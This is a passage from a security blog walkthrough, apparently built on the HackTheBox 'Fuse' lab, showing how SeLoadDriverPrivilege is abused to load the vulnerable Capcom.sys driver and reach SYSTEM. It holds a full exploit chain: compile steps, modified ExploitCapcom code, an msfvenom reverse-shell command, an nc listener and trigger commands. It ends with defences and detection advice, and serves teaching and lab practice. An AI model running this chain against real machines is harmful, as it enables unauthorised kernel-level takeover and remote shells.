<li>This registry key is crucial for driver loading, and access to it is a key part of the exploitation process.</li>
</ul>
<h3 id="step-3-loading-a-vulnerable-driver">Step 3: Loading a Vulnerable Driver:</h3>
<p>With the privilege activated and registry access established, the attacker can now load a driver of their choosing.</p>
<ul>
<li>This is typically done by registering a malicious or vulnerable driver via the Windows registry and then using the <code>NtLoadDriver()</code> function to load it into kernel mode.</li>
</ul>
<h3 id="step-4-exploiting-the-driver">Step 4: Exploiting the Driver:</h3>
<p>The final step involves exploiting the loaded driver. Attackers often choose to load known vulnerable drivers, such as the infamous <code>Capcom.sys</code>. (which is a Windows signed driver) These vulnerable drivers can be exploited to execute arbitrary code in kernel space, effectively giving the attacker complete control over the system.</p>
<h2 id="capcom-dot-sys-driver-vulnerability-arbitrary-code-execution-with-system-privileges">Capcom.sys Driver Vulnerability: Arbitrary Code Execution with SYSTEM Privileges</h2>
<p>Now that we&rsquo;ve confirmed we have the necessary privilege and the system is vulnerable, let&rsquo;s look at the specific vulnerability we&rsquo;ll be exploiting.</p>
<ul>
<li><strong>TL;DR</strong>: Key Takeaways</li>
<li><code>Capcom.sys</code> is a vulnerable driver that allows attackers to execute arbitrary code with <code>SYSTEM</code> privileges.</li>
<li>Protections like <code>VBS</code> and <code>HVCI</code> can help mitigate risks, but require modern hardware.</li>
<li><code>Driver block rules</code>: can provide an additional layer of defense by preventing vulnerable drivers from loading.</li>
</ul>
<h3 id="overview-of-the-capcom-dot-sys-vulnerability">Overview of the Capcom.sys Vulnerability:</h3>
<ul>
<li>
<p>The <code>Capcom.sys</code> kernel driver is notorious for its functionality that permits the execution of arbitrary code in kernel mode directly from user space.</p>
</li>
<li>
<p>Specifically, this driver disables <code>SMEP</code> (Supervisor Mode Execution Prevention) before invoking a function provided by the attacker, enabling us to run code with <code>SYSTEM</code> privileges.</p>
<ul>
<li>You can find the real <code>Capcom.sys</code> driver on GitHub: <a href="https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys">Capcom.sys driver on GitHub</a></li>
</ul>
</li>
<li>
<p><strong>Affected Windows Versions</strong>:</p>
<ul>
<li>This exploit has been tested and verified on the following Windows versions:</li>
<li>Windows 7 (x64)</li>
<li>Windows 8.1 (x64)</li>
<li>Windows 10 (x64) up to build <code>17134</code> (Version 1708)</li>
<li>Windows 11 (x64) up to build <code>22000.194</code> (Version 21H2)
<ul>
<li>Builds after <code>22000.194</code> contain deny lists that prevent this driver from loading.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Security Considerations</strong>:</p>
<ul>
<li>
<p>Modern versions of Windows have introduced protections like <code>Virtualization-based Security (VBS)</code> and <code>Hypervisor-Protected Code Integrity (HVCI)</code> to mitigate the risks posed by vulnerable drivers such as <code>Capcom.sys</code>.</p>
</li>
<li>
<p>These security mechanisms enforce code integrity in the kernel, allowing only signed code to execute and blocking known vulnerable or malicious drivers. However, it&rsquo;s important to note that these features often require newer hardware and can have a performance impact.</p>
</li>
<li>
<p>For a deeper dive into the issue of signed vulnerable drivers, you can refer to:</p>
<ul>
<li><a href="https://www.welivesecurity.com/2022/01/11/signed-kernel-drivers-unguarded-gateway-windows-core/">WeLiveSecurity&rsquo;s article</a></li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Mitigation Strategies</strong>:</p>
<ul>
<li>To safeguard against vulnerabilities like this, Microsoft recommends implementing <code>driver block rules</code> as part of a comprehensive security policy.</li>
<li>These block rules prevent the loading of known vulnerable or malicious drivers. Additionally, custom enterprise code integrity policies can be used to monitor and enforce these rules, with audit logs generated whenever a blocked driver attempts to load.</li>
</ul>
</li>
<li>
<p>For more on how to implement and enforce these rules, check out:</p>
<ul>
<li><a href="https://redcanary.com/blog/ms-driver-block-rules/">Red Canary&rsquo;s guide on driver block rules</a></li>
</ul>
</li>
</ul>
<h2 id="real-world-exploitation-example">Real-World Exploitation Example</h2>
<p>To better understand how <code>SeLoadDriverPrivilege</code> exploitation works in practice, let&rsquo;s walk through a real-world example. This demonstration will show each step of the process, from identifying the vulnerability to achieving system-level access.</p>
<h3 id="prerequisites">Prerequisites:</h3>
<p>Before we begin, ensure you have the following tools and environment set up:</p>
<ul>
<li>
<p>A Windows virtual machine for compiling the necessary tools:</p>
<ul>
<li>I recommend using <a href="https://github.com/mandiant/commando-vm">https://github.com/mandiant/commando-vm</a></li>
</ul>
</li>
<li>
<p>Visual Studio for C++ compilation</p>
</li>
<li>
<p>Msfvenom for payload generation</p>
</li>
<li>
<p>A target Windows machine with <code>SeLoadDriverPrivilege</code> enabled for a non-admin user</p>
<ul>
<li>This can be the Fuse machine on HTB or on an internal lab of your own.</li>
</ul>
</li>
<li>
<p>This is taken from my walkthrough of the HTB box fuse:</p>
<ul>
<li><a href="https://bloodstiller.com/walkthroughs/fuse-box/">https://bloodstiller.com/walkthroughs/fuse-box/</a></li>
</ul>
</li>
</ul>
<h3 id="finding-out-we-have-the-seloaddriverprivilege-privilege">Finding out we have the SeLoadDriverPrivilege privilege:</h3>
<p>The first step in any privilege escalation attempt is to enumerate the current user&rsquo;s privileges. In this case, we&rsquo;re looking specifically for the <code>SeLoadDriverPrivilege</code>.</p>
<ul>
<li><strong>I enumerate the privileges of my user</strong>:
<ul>
<li><code>whoami /priv</code></li>
<li><figure><img src="/ox-hugo/2024-10-17-144928_.png">
</figure>
</li>
<li>Checking my group memberships confirms this also:</li>
<li><figure><img src="/ox-hugo/2024-10-17-151209_.png">
</figure>
</li>
</ul>
</li>
</ul>
<h3 id="checking-the-system-is-vulnerable-to-the-exploit">Checking the system is vulnerable to the exploit:</h3>
<p>Not all systems are vulnerable to this exploit, even if the <code>SeLoadDriverPrivilege</code> is present. We need to check the Windows build number to ensure it&rsquo;s below a certain threshold.</p>
<ul>
<li><strong>I check the build</strong>:
<ul>
<li><code>[System.Environment]::OSVersion.Version</code></li>
<li><figure><img src="/ox-hugo/2024-10-18-173023_.png">
</figure>
</li>
<li>It&rsquo;s <code>14393</code> so we can move forward with this attack.</li>
</ul>
</li>
</ul>
<h3 id="executing-the-attack">Executing the Attack</h3>
<p>Now that we understand the vulnerability and have confirmed our system is susceptible, let&rsquo;s walk through the actual attack process.</p>
<ul>
<li>I will include all steps as a means for you to be able to reproduce this with the box Fuse.</li>
</ul>
<h4 id="download-a-copy-of-the-official-capcom-dot-sys-signed-driver">Download A Copy of the official Capcom.sys Signed Driver:</h4>
<ul>
<li><strong>Download the official driver</strong>:
<ul>
<li><code>wget https://github.com/FuzzySecurity/Capcom-Rootkit/raw/refs/heads/master/Driver/Capcom.sys</code>
<ul>
<li>We will keep it locally at the moment as there are some other tools we need to compile before we can move forward.</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="compiling-the-eoploaddriver-tool-to-enable-us-to-load-the-capcom-dot-sys-driver">Compiling the EopLoadDriver tool to enable us to load the Capcom.sys driver:</h4>
<p>The <code>EopLoadDriver</code> tool is a utility designed to leverage the <code>SeLoadDriverPrivilege</code> for loading a driver into the Windows kernel. It interacts with the Windows registry to register the driver and then uses the NtLoadDriver system call to load it. This tool is essential in our exploit chain as it allows us to load the vulnerable <code>Capcom.sys</code> driver, which we&rsquo;ll subsequently exploit to gain SYSTEM privileges. By using <code>EopLoadDriver</code>, we&rsquo;re able to bridge the gap between having the <code>SeLoadDriverPrivilege</code> and actually loading a driver of our choice into the kernel.</p>
<!-- raw HTML omitted -->
<ul>
<li>
<p>Preparing the <code>EopLoadDriver</code> C++ Project:</p>
<ul>
<li>
<p><strong>This is a</strong> <code>C++</code> <strong>file that will need to be compiled within</strong> <code>Visual Studio</code>:</p>
<ul>
<li>I download the project:
<ul>
<li><a href="https://github.com/TarlogicSecurity/EoPLoadDriver/">https://github.com/TarlogicSecurity/EoPLoadDriver/</a></li>
</ul>
</li>
<li>I create a new project:
<ul>
<li><figure><img src="/ox-hugo/2024-10-18-071257_.png">
</figure>
</li>
<li>Then type <code>Console</code> into the search bar &amp; select <code>ConsolApp</code> with <code>C++</code> written below it.</li>
<li>Click <code>Next</code></li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Give it a name &amp; also select</strong>: <code>Place solution and project in the same directory</code>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-10-18-071638_.png">
</figure>
</li>
<li><strong>Hit</strong> <code>&quot;Create&quot;</code></li>
</ul>
</li>
<li>
<p><strong>This provides a standard</strong> <code>Hello World</code> <strong>template, which can be used as the basis for the project</strong>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-10-18-072018_.png">
</figure>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li>
<p>Importing the <code>EopLoadDriver</code> code &amp; Compiling:</p>
<ul>
<li><strong>Delete all the code on the</strong> <code>Hello World</code> <strong>generated file &amp; paste in the contents of</strong> <a href="https://www.tarlogic.com/blog/seloaddriverprivilege-privilege-escalation/">Targlogic&rsquo;s</a> <code>EopLoadDriver</code> <strong>code</strong>:
<ul>
<li><a href="https://raw.githubusercontent.com/TarlogicSecurity/EoPLoadDriver/master/eoploaddriver.cpp">https://raw.githubusercontent.com/TarlogicSecurity/EoPLoadDriver/master/eoploaddriver.cpp</a></li>
</ul>
</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li>
<p><strong>Modify the imports by removing <code>stdafx.h</code> so they look like this now</strong>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-10-18-181622_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><strong>Run the build and it should build successfully</strong>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-10-18-072752_.png">
</figure>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="compiling-the-exploitcapcom-exploit-c-plus-plus-project">Compiling the ExploitCapcom exploit C++ project</h4>
<p>The <code>ExploitCapcom</code> tool is the core component of our privilege escalation attack. It&rsquo;s designed to exploit the vulnerability in the <code>Capcom.sys</code> driver that we&rsquo;ve loaded using <code>EopLoadDriver</code>. This tool takes advantage of the driver&rsquo;s ability to disable Supervisor Mode Execution Prevention (SMEP) and execute arbitrary code in kernel mode. By default, ExploitCapcom opens a new command prompt with <code>SYSTEM privileges</code>, but we&rsquo;ll modify it to launch our custom payload instead. This tool effectively completes the privilege escalation chain, leveraging the loaded vulnerable driver to elevate our permissions to the highest level in the Windows operating system.</p>
<!-- raw HTML omitted -->
<ul>
<li>
<p>Importing the <code>ExploitCapcom C++</code> Project:</p>
<ul>
<li>
<p><strong>This time clone the repo</strong>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-10-18-111819_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><strong>Paste in the repo url</strong>:</p>
<ul>
<li><a href="https://github.com/tandasat/ExploitCapcom.git">https://github.com/tandasat/ExploitCapcom.git</a></li>
<li><figure><img src="/ox-hugo/2024-10-18-111850_.png">
</figure>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="modifying-exploitcapcom-exploit-to-enable-a-reverse-shell">Modifying ExploitCapcom exploit to enable a reverse shell</h4>
<p>To make our exploit more useful, we&rsquo;ll modify it to give us a reverse shell instead of just opening a new command prompt.</p>
<ul>
<li>
<p><strong>Open</strong> <code>ExploitCapcom.cpp</code> <strong>and do not remove the</strong> <code>stdafx.h</code> <strong>import</strong>:</p>
<ul>
<li>The reason being is the actual required file containing the header is in this project. So you can compile with it.
<ul>
<li><figure><img src="/ox-hugo/2024-10-18-125040_.png">
</figure>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>This exploit by default opens a new elevated shell, however this requires we have</strong> <code>GUI</code> <strong>access. So modify to run a reverse shell</strong>:</p>
<ul>
<li>
<p>Below is the code we are going to modify:</p>
<ul>
<li><code>TCHAR CommandLine[] = TEXT(&quot;C:\\Windows\\system32\\cmd.exe&quot;);</code></li>
</ul>
</li>
<li>
<p>Modify it to run a reverse shell generated via <code>msfvenom</code>:</p>
<ul>
<li>Remember if you are not using the Fuse walkthrough to modify the path to one you have access to.</li>
</ul>
<!-- raw HTML omitted -->







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="%20%20//%20Launches%20a%20command%20shell%20process%0a%20%20static%20bool%20LaunchShell%28%29%0a%20%20%7b%0a%20%20%20%20%20%20//Original%20Line%20Commented%20Out:%0a%20%20%20%20%20%20//TCHAR%20CommandLine[]%20=%20TEXT%28%22C:%5c%5cWindows%5c%5csystem32%5c%5ccmd.exe%22%29;%0a%20%20%20%20%20%20TCHAR%20CommandLine[]%20=%20TEXT%28%22C:%5c%5cUsers%5c%5csvc-print%5c%5cDocuments%5c%5cshell.exe%22%29;%0a%20%20%20%20%20%20PROCESS_INFORMATION%20ProcessInfo;%0a%20%20%20%20%20%20STARTUPINFO%20StartupInfo%20=%20%7b%20sizeof%28StartupInfo%29%20%7d;%0a%20%20%20%20%20%20if%20%28!CreateProcess%28CommandLine,%20CommandLine,%20nullptr,%20nullptr,%20FALSE,%0a%20%20%20%20%20%20%20%20%20%20CREATE_NEW_CONSOLE,%20nullptr,%20nullptr,%20&amp;StartupInfo,%0a%20%20%20%20%20%20%20%20%20%20&amp;ProcessInfo%29%29%0a%20%20%20%20%20%20%7b%0a%20%20%20%20%20%20%20%20%20%20return%20false;%0a%20%20%20%20%20%20%7d%0a%0a%20%20%20%20%20%20CloseHandle%28ProcessInfo.hThread%29;%0a%20%20%20%20%20%20CloseHandle%28ProcessInfo.hProcess%29;%0a%20%20%20%20%20%20return%20true;%0a%20%20%7d">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C++" data-lang="C++"><span style="display:flex;"><span>  <span style="color:#75715e">// Launches a command shell process
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">bool</span> <span style="color:#a6e22e">LaunchShell</span>()
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">//Original Line Commented Out:
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#75715e">//TCHAR CommandLine[] = TEXT(&#34;C:\\Windows\\system32\\cmd.exe&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      TCHAR CommandLine[] <span style="color:#f92672">=</span> TEXT(<span style="color:#e6db74">&#34;C:</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Users</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">svc-print</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Documents</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">shell.exe&#34;</span>);
</span></span><span style="display:flex;"><span>      PROCESS_INFORMATION ProcessInfo;
</span></span><span style="display:flex;"><span>      STARTUPINFO StartupInfo <span style="color:#f92672">=</span> { <span style="color:#66d9ef">sizeof</span>(StartupInfo) };
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>CreateProcess(CommandLine, CommandLine, <span style="color:#66d9ef">nullptr</span>, <span style="color:#66d9ef">nullptr</span>, FALSE,
</span></span><span style="display:flex;"><span>          CREATE_NEW_CONSOLE, <span style="color:#66d9ef">nullptr</span>, <span style="color:#66d9ef">nullptr</span>, <span style="color:#f92672">&amp;</span>StartupInfo,
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">&amp;</span>ProcessInfo))
</span></span><span style="display:flex;"><span>      {
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      CloseHandle(ProcessInfo.hThread);
</span></span><span style="display:flex;"><span>      CloseHandle(ProcessInfo.hProcess);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> true;
</span></span><span style="display:flex;"><span>  }</span></span></code></pre></div>
    
</div>
</li>
</ul>
</li>
<li>
<p><strong>Compile it</strong>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-10-18-125121_.png">
</figure>
</li>
</ul>
</li>
</ul>
<h4 id="generating-our-reverse-shell-payload-using-msfvenom">Generating our reverse-shell payload using msfvenom:</h4>
<ul>
<li><strong>Generate a simple reverse shell using</strong> <code>msfvenom</code>:
<ul>
<li><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=[AttackIP] LPORT=[AttackPort] -f exe -o shell.exe</code></li>
<li><figure><img src="/ox-hugo/2024-10-18-143546_.png">
</figure>
</li>
</ul>
</li>
</ul>
<h4 id="run-the-exploit-chain-on-the-victim">Run the exploit chain on the victim:</h4>
<p>Now that we have all our tools ready, let&rsquo;s execute the attack:</p>
<ol>
<li>
<p><strong>I Use</strong> <code>evil-winrm</code> <strong>to transfer all the files to the target</strong>:</p>
<ul>
<li><code>upload [filename]</code></li>
<li><figure><img src="/ox-hugo/2024-10-18-130359_.png">
</figure>
</li>
<li>Use whatever method you prefer</li>
</ul>
</li>
<li>
<p><strong>Load the driver Run Exploit</strong>:</p>
<ul>
<li><code>.\EopLoadDriver.exe System\CurrentControlSet\Capcom C:\Users\svc-print\Documents\Capcom.sys</code></li>
<li><figure><img src="/ox-hugo/2024-10-18-130552_.png">
</figure>
</li>
<li>All 0&rsquo;s is good as a response, means we are working.</li>
</ul>
</li>
<li>
<p><strong>Setup Listener</strong>:</p>
<ul>
<li><code>rlwrap -cAr nc -lnvp 443</code></li>
</ul>
</li>
<li>
<p><strong>Trigger exploit</strong>:</p>
<ul>
<li><code>.\ExploitCapcom.exe</code></li>
<li><figure><img src="/ox-hugo/2024-10-18-143703_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><strong>Catch the reverse shell and verify privileges</strong>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-10-18-143802_.png">
</figure>
</li>
</ul>
</li>
</ol>
<h3 id="summary">Summary:</h3>
<p>This real-world example demonstrates the entire process of exploiting the <code>SeLoadDriverPrivilege</code>, from initial enumeration to achieving <code>SYSTEM</code>-level access.</p>
<h2 id="defending-against-seloaddriverprivilege-attacks">Defending Against SeLoadDriverPrivilege Attacks:</h2>
<p>Given the potential for abuse, it&rsquo;s crucial for system administrators to take steps to mitigate the risks associated with <code>SeLoadDriverPrivilege</code>. This includes:</p>
<ol>
<li>Restricting privilege assignment to only the most trusted accounts.</li>
<li>Implementing rigorous driver integrity checks.</li>
<li>Regularly auditing account privileges to detect any unauthorized changes.</li>
<li>Using driver blocklists to prevent known vulnerable drivers from being loaded.</li>
<li>Employing application control solutions like Windows Defender Application Control (WDAC) or AppLocker to restrict driver loading.</li>
</ol>
<p>Detection is equally important. Monitoring Windows Event Logs for driver loading events (Event ID 6), configuring <code>Sysmon</code> to track driver loads, and implementing behavioral analysis to spot unusual patterns of driver loading can all help in identifying potential attacks.</p>
<p>It&rsquo;s important to note that no single measure can provide complete protection against SeLoadDriverPrivilege exploitation. A defense-in-depth strategy, combining multiple layers of security controls, is crucial for comprehensive protection against this and other potential vulnerabilities.</p>
<h2 id="conclusion">Conclusion:</h2>
<p><code>SeLoadDriverPrivilege</code> serves as a stark reminder of the complexities involved in securing modern operating systems. What appears to be a benign administrative privilege can, in the wrong hands, become a powerful tool for system compromise. Mitigating such vulnerabilities will remain crucial in our ongoing efforts to protect our systems and data.</p>
<h2 id="further-reading">Further Reading:</h2>
<p><strong>For those interested in diving deeper into this topic, I recommend exploring</strong>:</p>
<ul>
<li><a href="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/user-rights-assignment">Microsoft documentation on User Rights Assignment</a></li>
<li><a href="https://www.amazon.co.uk/dp/0735684189?psc=1&amp;smid=A3P5ROKL5A1OLE&amp;ref_=chk_typ_imgToDp">Windows Internals, Part 1 by Pavel Yosifovich</a></li>
<li><a href="https://attack.mitre.org/">MITRE ATT&amp;CK framework</a>, particularly the entry on <a href="https://attack.mitre.org/techniques/T1543/003/">T1543.003</a> - Create or Modify System Process (Windows Service).</li>
</ul>
<h2 id="frequently-asked-questions">Frequently Asked Questions:</h2>
<ul>
<li>
<p><strong>Q: Is <code>SeLoadDriverPrivilege</code> a vulnerability in Windows?</strong></p>
<ul>
<li>A: <code>SeLoadDriverPrivilege</code> itself is not a vulnerability, but rather a legitimate Windows privilege that can be misused. The vulnerability lies in improper assignment or management of this privilege.</li>
</ul>
</li>
<li>
<p><strong>Q: Can <code>SeLoadDriverPrivilege</code> be completely disabled?</strong></p>
<ul>
<li>A: While it&rsquo;s not recommended to completely disable this privilege as it&rsquo;s used by legitimate Windows processes, it&rsquo;s crucial to strictly limit which accounts have this privilege assigned.</li>
</ul>
</li>
<li>
<p><strong>Q: How can I check if my account has <code>SeLoadDriverPrivilege</code>?</strong></p>
<ul>
<li>A: You can use the Windows &ldquo;Local Security Policy&rdquo; editor (<code>secpol.msc</code>) and navigate to &ldquo;Security Settings&rdquo; &gt; &ldquo;Local Policies&rdquo; &gt; &ldquo;User Rights Assignment&rdquo; to see which accounts have this privilege assigned.</li>
</ul>
</li>
<li>
<p><strong>Q: Are there any legitimate uses for <code>SeLoadDriverPrivilege</code>?</strong></p>
<ul>
<li>A: Yes, this privilege is used by system processes and certain applications that need to load drivers. For example, some antivirus software and system management tools require this privilege.</li>
</ul>
</li>
<li>
<p><strong>Q: How difficult is it to exploit <code>SeLoadDriverPrivilege</code>?</strong></p>
<ul>
<li>A: While the basic concept is straightforward, successfully exploiting this privilege requires a good understanding of Windows internals and kernel-mode programming. However, ready-made exploit tools do exist, lowering the barrier for less skilled attackers.</li>
</ul>
</li>
</ul>
<h2 id="appendix">Appendix:</h2>
<ul>
<li><strong>Sources used</strong>:
<ul>
<li><a href="https://attack.mitre.org/techniques/T1543/003/">https://attack.mitre.org/techniques/T1543/003/</a></li>
<li><a href="https://www.amazon.co.uk/dp/0735684189?psc=1&amp;smid=A3P5ROKL5A1OLE&amp;ref_=chk_typ_imgToDp">https://www.amazon.co.uk/dp/0735684189?psc=1&amp;smid=A3P5ROKL5A1OLE&amp;ref_=chk_typ_imgToDp</a></li>
<li><a href="https://github.com/TarlogicSecurity/EoPLoadDriver/">https://github.com/TarlogicSecurity/EoPLoadDriver/</a></li>
<li><a href="https://www.tarlogic.com/blog/seloaddriverprivilege-privilege-escalation/">https://www.tarlogic.com/blog/seloaddriverprivilege-privilege-escalation/</a></li>
<li><a href="https://redcanary.com/blog/threat-detection/ms-driver-block-rules/">https://redcanary.com/blog/threat-detection/ms-driver-block-rules/</a></li>
<li><a href="https://www.welivesecurity.com/2022/01/11/signed-kernel-drivers-unguarded-gateway-windows-core/">https://www.welivesecurity.com/2022/01/11/signed-kernel-drivers-unguarded-gateway-windows-core/</a></li>
<li><a href="https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt">https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt</a></li>
</ul>
</li>
</ul>

            
        </div>
    </article>

        </main>

        <footer class="footer">
    <div class="footer-left">
        <ul class="social">
            
                <li>All Rights Reserved .</li>
            

            
                <li>Bloodstiller</li>
            

            
                
            
                
            
                
                    <li>
                        
                            <a href="https://github.com/bloodstiller" target="_blank">
                                <i class="bi-github"></i>
                            </a>
                        

                    </li>
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
        </ul>
    </div>

    <div class="footer-right">
        <ul class="control status clearfix">
            
                <li>
                    
                        Word Count:
                        2431
                    
                </li>
            


            
                <li>en</li>
            

            

            

            
                <li>
                    
                        Last modified: &nbsp;
                        <time>
                            Oct 20 2024 00:00:00
                        </time>
                    
                </li>
            

            
        </ul>
    </div>
</footer>

    </body>

    






















    
        
        <script
            type="text/javascript"
            src="/_theme/js/codeblock_copy.c59588ba3a219dafab515508b0bcd2d0592dc9e0e08de20dc1983bfd8cb69d03d37c78eadd81ee7bef724570f9e4286d9ea1c53ca59d3711c0bcad9e9134d0e9.js"
            integrity="sha512-xZWIujohna&#43;rUVUIsLzS0FktyeDgjeINwZg7/Yy2nQPTfHjq3YHue&#43;9yRXD55ChtnqHFPKWdNxHAvK2ekTTQ6Q=="></script>
    
        
        <script
            type="text/javascript"
            src="/_theme/js/custom.e55ae031ca7d8c1e9bde9a72058dd382e3de5ff9b7df41d6d0e4ccb82ff9962e74b4865412dc15db16e5f16012d5cf9e2330b9826a3a36d5a272077f70e1341b.js"
            integrity="sha512-5VrgMcp9jB6b3ppyBY3TguPeX/m330HW0OTMuC/5li50tIZUEtwV2xbl8WAS1c&#43;eIzC5gmo6NtWicgd/cOE0Gw=="></script>
    
        
        <script
            type="text/javascript"
            src="/_theme/js/dir_toggle.e6f8c63f3ed9aefa9cedb3be3d5ab67e00bc3cf87a8dd7ef1ed55d642e9a7d80837636a26ae77f967f2aa74a44ae70c4134e25abca587f048c60807ba9e9c82f.js"
            integrity="sha512-5vjGPz7Zrvqc7bO&#43;PVq2fgC8PPh6jdfvHtVdZC6afYCDdjaiaud/ln8qp0pErnDEE04lq8pYfwSMYIB7qenILw=="></script>
    
        
        <script
            type="text/javascript"
            src="/_theme/js/sidebar.01b59c615736643387108a100de70c51d5e98477bdc338244a87d37f7e38286b48683459eade68087f0688f0235e7a48691e633954fa930d41823e9ddf797085.js"
            integrity="sha512-AbWcYVc2ZDOHEIoQDecMUdXphHe9wzgkSofTf344KGtIaDRZ6t5oCH8GiPAjXnpIaR5jOVT6kw1Bgj6d33lwhQ=="></script>
    















<link
    rel="stylesheet"
    href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css" />




</html>
